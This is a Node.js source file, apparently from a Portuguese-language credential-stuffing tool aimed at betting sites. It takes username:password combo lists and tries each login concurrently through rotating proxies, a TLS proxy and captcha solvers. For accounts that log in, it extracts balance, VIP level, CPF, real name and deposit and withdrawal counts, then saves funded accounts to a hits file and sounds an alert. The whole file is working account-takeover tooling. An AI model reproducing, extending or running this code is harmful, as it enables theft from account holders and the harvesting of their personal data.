import fs from "fs";
import path from "path";
import { exec } from "child_process";
import { ROOT } from "./paths.js";
import { loadPlatforms } from "./platforms.js";
import { loadProxies, getProxyCount } from "./proxy.js";
import { startTlsProxy } from "./tls.js";
import { doLogin, getAccountDetails, interpretResult } from "./login.js";
import { runPool } from "./pool.js";
import { banner, prompt, separator, c } from "./ui.js";
import { loadCaptchaConfig } from "./captcha.js";
import { sendDesktopNotification } from "./notification.js";

let currentProgressBarText = "";
let currentPlatformHeader = "";

function sliceAnsi(str, limit) {
  let visibleLen = 0;
  let result = "";
  let i = 0;
  while (i < str.length && visibleLen < limit) {
    if (str[i] === "\x1b") {
      const match = str.slice(i).match(/^\x1b\[[0-9;]*[a-zA-Z]/);
      if (match) {
        result += match[0];
        i += match[0].length;
        continue;
      }
    }
    result += str[i];
    visibleLen++;
    i++;
  }
  if (!result.endsWith("\x1b[0m")) {
    result += "\x1b[0m";
  }
  return result;
}

function drawProgressBar(done, total, stats) {
  const percentage = total > 0 ? Math.floor((done / total) * 100) : 0;
  const barLength = 10;
  const filledLength = Math.floor((percentage / 100) * barLength);
  const bar = "█".repeat(filledLength) + "░".repeat(barLength - filledLength);

  const line = `  [${bar}] ${percentage}% | ${done}/${total} | ` +
    `${c.GREEN}Hits:${stats.hits}${c.RESET} | ` +
    `${c.YELLOW}SS:${stats.semSaldo || 0}${c.RESET} | ` +
    `${c.R}Proib:${stats.proibida}${c.RESET} | ` +
    `\x1b[35mBad:${stats.badPass}${c.RESET} | ` +
    `${c.DIM}NF:${stats.notFound}${c.RESET} | ` +
    `${c.CYAN}Unk:${stats.unknown}${c.RESET} | ` +
    `\x1b[31;1mErr:${stats.errors}${c.RESET}`;

  currentProgressBarText = line;
  const cols = process.stdout.columns || 80;
  const lineTruncated = sliceAnsi(line, cols - 1);
  const headerTruncated = sliceAnsi(currentPlatformHeader, cols - 1);
  const divider = `  ${c.DIM}${"─".repeat(cols - 4)}${c.RESET}`;

  process.stdout.write(`\u001b[s\u001b[1;1H\u001b[K${headerTruncated}\n\u001b[2;1H\u001b[K${lineTruncated}\n\u001b[3;1H\u001b[K${divider}\u001b[u`);
}

function logMessage(message) {
  process.stdout.write(`${message}\n`);
}

export async function cmdRun() {
  currentProgressBarText = "";
  const platforms = loadPlatforms();
  const keys = Object.keys(platforms);

  let domain, siteCode, apiHost, platformName, isPanda = false;

  if (keys.length > 0) {
    console.log(`\n  ${c.CYAN}${c.B}Plataformas disponíveis:${c.RESET}`);
    console.log(`  ${c.DIM}${"─".repeat(80)}${c.RESET}`);

    let maxCol1Length = 0;
    for (let i = 0; i < keys.length; i += 2) {
      const k1 = keys[i];
      const p1 = platforms[k1];
      const plainLength = `[${i + 1}] ${k1.padEnd(12)} ${p1.domain}`.length;
      if (plainLength > maxCol1Length) {
        maxCol1Length = plainLength;
      }
    }
    const colSpacing = maxCol1Length + 4;

    for (let i = 0; i < keys.length; i += 2) {
      let line = "  ";

      const k1 = keys[i];
      const p1 = platforms[k1];
      const item1 = `${c.YELLOW}[${i + 1}]${c.RESET} ${k1.padEnd(12)} ${c.DIM}${p1.domain}${c.RESET}`;
      const plainLength1 = `[${i + 1}] ${k1.padEnd(12)} ${p1.domain}`.length;
      line += item1;

      if (i + 1 < keys.length) {
        const k2 = keys[i + 1];
        const p2 = platforms[k2];
        const item2 = `${c.YELLOW}[${i + 2}]${c.RESET} ${k2.padEnd(12)} ${c.DIM}${p2.domain}${c.RESET}`;
        const spacesNeeded = colSpacing - plainLength1;
        line += " ".repeat(spacesNeeded) + item2;
      }

      console.log(line);
    }

    console.log(`  ${c.DIM}${"─".repeat(80)}${c.RESET}`);
    console.log(`  ${c.YELLOW}[${keys.length + 1}]${c.RESET} Manual (informar domain/siteCode)`);
    console.log(`  ${c.YELLOW}[0]${c.RESET} Cancelar\n`);

    const choice = parseInt(await prompt(`  ${c.B}→${c.RESET} Escolha a plataforma: `), 10);
    if (!choice || choice === 0) return;

    if (choice <= keys.length) {
      platformName = keys[choice - 1];
      ({ domain, siteCode, apiHost, isPanda } = platforms[platformName]);
      apiHost = apiHost || domain;
    } else {
      domain = await prompt("  Domain (ex: bet505.com): ");
      siteCode = await prompt("  SiteCode: ");
      apiHost = domain;
      const pandaStr = await prompt("  É plataforma Panda/W78? [s/N]: ");
      isPanda = pandaStr.toLowerCase() === "s";
    }
  } else {
    console.log("\n  Nenhuma plataforma cadastrada. Informe manualmente:\n");
    domain = await prompt("  Domain: ");
    siteCode = await prompt("  SiteCode: ");
    apiHost = domain;
    const pandaStr = await prompt("  É plataforma Panda/W78? [s/N]: ");
    isPanda = pandaStr.toLowerCase() === "s";
  }

  const threadsStr = await prompt(`  Threads ${c.DIM}[padrão: 50]${c.RESET}: `);
  const threads = parseInt(threadsStr || "50", 10);

  const defaultFile = path.join(ROOT, "contas.txt");
  const fileStr = await prompt(`  Arquivo de contas ${c.DIM}[padrão: contas.txt]${c.RESET}: `);
  const file = fileStr || defaultFile;

  const soundStr = await prompt(`  Alerta sonoro? [S/n]: `);
  const enableSound = soundStr.toLowerCase() !== "n";

  const notifyStr = await prompt(`  Notificação de área de trabalho? [S/n]: `);
  const enableNotifications = notifyStr.toLowerCase() !== "n";

  const proxyFile = path.join(ROOT, "proxy.txt");

  const debug = false;
  global.debug = false;

  banner();

  if (!fs.existsSync(file)) {
    fs.writeFileSync(file, "usuario1:senha1\nusuario2:senha2\n");
    console.log(`  📄 Arquivo ${file} criado com exemplo. Edite e rode novamente.\n`);
    return;
  }

  const rawLines = fs.readFileSync(file, "utf-8")
    .split("\n").map((l) => l.trim()).filter((l) => l && l.includes(":"));

  const beforeCount = rawLines.length;
  const lines = [...new Set(rawLines)];
  const afterCount = lines.length;

  if (beforeCount !== afterCount) {
    try {
      fs.writeFileSync(file, lines.join("\n") + "\n", "utf-8");
      console.log(`  ${c.GREEN}🧹 Duplicatas removidas do arquivo: ${beforeCount - afterCount} repetidas apagadas. Mantendo ${afterCount} contas.${c.RESET}`);
    } catch (e) {
      console.log(`  ${c.YELLOW}⚠️  Erro ao atualizar o arquivo para remover duplicatas: ${e.message}${c.RESET}`);
      console.log(`  📋 Prosseguindo com as ${afterCount} contas únicas na memória.`);
    }
  }

  const captchaConfig = loadCaptchaConfig();
  if (captchaConfig.provider !== "disabled") {
    let isValid = true;
    if (captchaConfig.provider === "custom" && !captchaConfig.customApiUrl) isValid = false;
    if (["capsolver", "2captcha", "anticaptcha"].includes(captchaConfig.provider) && !captchaConfig.apiKey) isValid = false;

    if (!isValid) {
      captchaConfig.provider = "disabled";
    }
  }

  loadProxies(proxyFile);
  const proxyCount = getProxyCount();
  if (proxyCount > 0) {
    console.log(`  🌐 Usando proxy rotativo (${proxyCount} proxies carregados de proxy.txt)`);
  } else {
    console.log(`  🌐 Sem proxy (proxy.txt vazio ou não encontrado)`);
  }
  await startTlsProxy();

  // Set top-fixed progress bar layout
  const platformTag = platformName ? `${platformName} (${domain})` : domain;
  currentPlatformHeader = `  🎯 Plataforma: ${platformTag} | SiteCode: ${siteCode} | Tipo: ${isPanda ? "Panda" : "Legacy"}`;

  process.stdout.write("\u001b[2J\u001b[H"); // Clear screen, move cursor to top-left
  process.stdout.write("\u001b[4;r"); // Set scroll region from line 4 onwards
  process.stdout.write("\u001b[4;1H"); // Move cursor to line 4

  console.log(`  📋 Contas: ${lines.length} | Threads: ${threads}\n`);

  const results = { existe: [], proibida: [], semSaldo: [], naoExiste: [], senhaErrada: [], erro: [], inconclusivo: [] };

  // Render initial progress bar
  drawProgressBar(0, lines.length, { hits: 0, semSaldo: 0, proibida: 0, badPass: 0, notFound: 0, unknown: 0, errors: 0 });

  const hitsDir = path.join(ROOT, "hits");
  if (!fs.existsSync(hitsDir)) fs.mkdirSync(hitsDir);
  const hitsFile = path.join(hitsDir, `hits_${(platformName || domain).replace(/[^a-z0-9]/gi, "_")}.txt`);

  fs.writeFileSync(hitsFile, `=== HITS ${platformName || domain} — ${new Date().toLocaleString()} ===\n`, "utf-8");

  let doneCount = 0;
  const tasks = lines.map((line) => async () => {
    const idx = line.indexOf(":");
    const username = line.slice(0, idx).trim();
    const userpass = line.slice(idx + 1).trim();
    const raw = await doLogin(domain, siteCode, username, userpass, apiHost, isPanda);
    const { status, detail } = interpretResult(raw, debug);
    const label = `${username}:${userpass}`;

    if (status.includes("✅")) {
      if (debug) console.log("  [HIT RAW]", JSON.stringify(raw));
      let info = { userId: "", balance: null, vip: null, rollover: null, statusStr: "", cpf: "", realname: "", deposits: null, withdraws: null };
      try { info = getAccountDetails(raw); } catch { }

      const balanceStr = info.balance !== null ? `R$${Number(info.balance).toFixed(2)}` : "?";
      const vipStr = info.vip !== null ? `VIP${info.vip}` : "?";
      const rolloverStr = info.rollover !== null && info.rollover > 0
        ? `rollover=R$${Number(info.rollover).toFixed(2)}` : "sem rollover";
      const idStr = info.userId ? `id=${info.userId}` : "";

      let logBalanceStr = balanceStr;
      if (info.balance !== null && Number(info.balance) >= 10.0) {
        logBalanceStr = `${c.YELLOW}${balanceStr}${c.RESET}`;
      }

      const hitLine = [
        `${username}:${userpass}`, idStr, `saldo=${balanceStr}`, vipStr, rolloverStr,
        info.statusStr,
        info.cpf ? `cpf=${info.cpf}` : "",
        info.realname ? `nome=${info.realname}` : "",
        info.deposits !== null ? `depositos=${info.deposits}x` : "",
        info.withdraws !== null ? `saques=${info.withdraws}x` : "",
      ].filter(Boolean).join(" | ");

      if (info.statusStr === "proibida") {
        const logForbiddenLine = [
          `${c.R}[🚫 PROIBIDA]${c.RESET} ${username}:${userpass}`,
          `Saldo: ${logBalanceStr}`,
          `VIP: ${vipStr}`,
          `Nome: ${info.realname || "?"}`,
          `Saques: ${info.withdraws !== null ? info.withdraws + "x" : "?"}`,
          `Status: ${info.statusStr}`
        ].join(" | ");
        logMessage(logForbiddenLine);
        results.proibida.push(hitLine);
      } else {
        const balanceVal = info.balance !== null ? Number(info.balance) : 0;
        const vipVal = info.vip !== null ? Number(info.vip) : 0;

        const isVip3OrAbove = vipVal >= 3;
        const shouldSave = isVip3OrAbove || balanceVal >= 3.0;

        if (shouldSave) {
          const logHitLine = [
            `${c.GREEN}[✅ HIT]${c.RESET} ${c.B}${username}:${userpass}${c.RESET}`,
            `Saldo: ${logBalanceStr}`,
            `VIP: ${vipStr}`,
            `Nome: ${info.realname || "?"}`,
            `Saques: ${info.withdraws !== null ? info.withdraws + "x" : "?"}`,
            `Status: ${info.statusStr || "ativa"}`
          ].join(" | ");
          logMessage(logHitLine);
          if (enableSound && balanceVal >= 3.0) {
            exec('powershell -c "(New-Object Media.SoundPlayer \'C:\\Windows\\Media\\Speech On.wav\').PlaySync()"', () => { });
          }
          if (enableNotifications) {
            sendDesktopNotification(platformName || domain, balanceStr, username);
          }

          results.existe.push(hitLine);
          fs.appendFileSync(hitsFile, hitLine + "\n", "utf-8");
        } else {
          const logSemSaldoLine = [
            `${c.YELLOW}[⚠️ SEM SALDO]${c.RESET} ${username}:${userpass}`,
            `Saldo: ${logBalanceStr}`,
            `VIP: ${vipStr}`,
            `Nome: ${info.realname || "?"}`,
            `Saques: ${info.withdraws !== null ? info.withdraws + "x" : "?"}`,
            `Status: ${info.statusStr || "ativa"}`
          ].join(" | ");
          logMessage(logSemSaldoLine);

          results.semSaldo.push(hitLine);
        }
      }
    } else {
      // console.log(`  [${status}] ${label}  (${detail})`);
      if (status.includes("senha")) {
        results.senhaErrada.push(label);
      } else if (status.includes("NÃO") || status.includes("FORMATO")) {
        results.naoExiste.push(label);
      } else if (status.includes("ERRO")) {
        results.erro.push(label);
      } else if (status.toLowerCase().includes("proibida")) {
        results.proibida.push(`${label} | ${detail}`);
        logMessage(`${c.R}[🚫 PROIBIDA]${c.RESET} ${label} | ${detail}`);
      } else {
        results.inconclusivo.push(label);
      }
    }
    // Update progress bar after each account processed
    doneCount++;
    drawProgressBar(doneCount, lines.length, {
      hits: results.existe.length,
      semSaldo: results.semSaldo.length,
      proibida: results.proibida.length,
      badPass: results.senhaErrada.length,
      notFound: results.naoExiste.length,
      unknown: results.inconclusivo.length,
      errors: results.erro.length
    });
  });

  const originalLog = console.log;
  const originalError = console.error;
  if (!debug) {
    console.log = () => { };
    console.error = () => { };
  }

  const sigintHandler = () => {
    process.stdout.write("\u001b[r"); // Reset scrolling region
    process.stdout.write('\n');
    process.exit(0);
  };
  process.on('SIGINT', sigintHandler);

  try {
    await runPool(tasks, threads);
  } finally {
    process.removeListener('SIGINT', sigintHandler);
    process.stdout.write("\u001b[r"); // Reset scrolling region
    const rows = process.stdout.rows || 24;
    process.stdout.write(`\u001b[${rows};1H\n`);

    if (!debug) {
      console.log = originalLog;
      console.error = originalError;
    }
  }

  const out = path.join(ROOT, "resultados.txt");
  const tag = platformName ? `${platformName} (${domain})` : domain;
  fs.writeFileSync(out, [
    `=== RESULTADO (${new Date().toLocaleString()}) ===`,
    `Plataforma: ${tag} | SiteCode: ${siteCode}`, "",
    `✅ HITS (${results.existe.length}):`, ...results.existe,
    "", `⚠️  SEM SALDO (${results.semSaldo.length}):`, ...results.semSaldo,
    "", `🚫 PROIBIDA (${results.proibida.length}):`, ...results.proibida,
    "", `⚠️  SENHA ERRADA (${results.senhaErrada.length}):`, ...results.senhaErrada,
    "", `❌ NÃO EXISTE (${results.naoExiste.length}):`, ...results.naoExiste,
    "", `⚠️  INCONCLUSIVO (${results.inconclusivo.length}):`, ...results.inconclusivo,
    "", `❗ ERRO (${results.erro.length}):`, ...results.erro,
  ].join("\n"), "utf-8");

  separator();
  console.log(`  ${c.GREEN}✅ Existe (Hits):${c.RESET}     ${results.existe.length}`);
  console.log(`  ${c.YELLOW}⚠️  Sem Saldo:${c.RESET}        ${results.semSaldo.length}`);
  console.log(`  🚫 Proibida:        ${results.proibida.length}`);
  console.log(`  ⚠️  Senha errada:   ${results.senhaErrada.length}`);
  console.log(`  ❌ Não existe:      ${results.naoExiste.length}`);
  console.log(`  ⚠️  Inconclusivo:   ${results.inconclusivo.length}`);
  console.log(`  ❗ Erro:            ${results.erro.length}`);
  separator();
  console.log(`  📄 Resultados:  ${out}`);
  if (results.existe.length > 0) console.log(`  🎯 Hits salvos: ${hitsFile}`);
  console.log();
}
